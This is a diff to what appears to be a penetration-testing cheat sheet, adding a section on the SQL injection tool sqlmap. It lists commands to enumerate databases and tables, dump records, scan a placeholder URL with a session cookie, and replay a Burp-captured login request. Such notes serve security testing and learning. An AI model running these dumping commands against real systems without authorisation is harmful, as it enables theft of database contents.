@@ -59,11 +59,42 @@ WHERE id='%s';
 
 ---
 
-## sqlmap
+## SQLMap
 
 A tool for finding and exploiting SQLi vulnerabilities in input fields or urls.
 
-Syntax:
+```bash
+# guides through setting all necessary flags for the user
+$ sqlmap --wizard
+```
+
+```bash
+# extract database names
+$ sqlmap --dbs
+
+# extract info about the tables of a specific database
+$ sqlmap -D <db_name> --tables
+
+# enumerate the records in a table
+$ sqlmap -D <db_name> -T <table_name> --dump
+
+# in-depth scans
+$ sqlmap <options> --level=5
+```
+
+#### HTTP GET-based testing
+
+A URL like http://vulnerable.site/search?user=1 could be scanned like this:
+
+```bash
+# lists database names
+# note the single quotes to avoid errors with special characters such as ?
+$ sqlmap -u 'http://vulnerable.site/search?user=1' --cookie="SESSIONID=abcd123" --dbs
+```
+
+#### HTTP POST-based testing
+
+Intercept a POST request on a login form, registration form, etc. and save it as a text file. SQLMap can parse the text file:
 
 ```bash
 # req.txt should be saved directly from some Request window in burp suite
@@ -72,5 +103,3 @@ Syntax:
 # --batch never ask for user input, use the default behaviour
 $ python3 sqlmap.py -r req.txt --dump
 ```
-
----
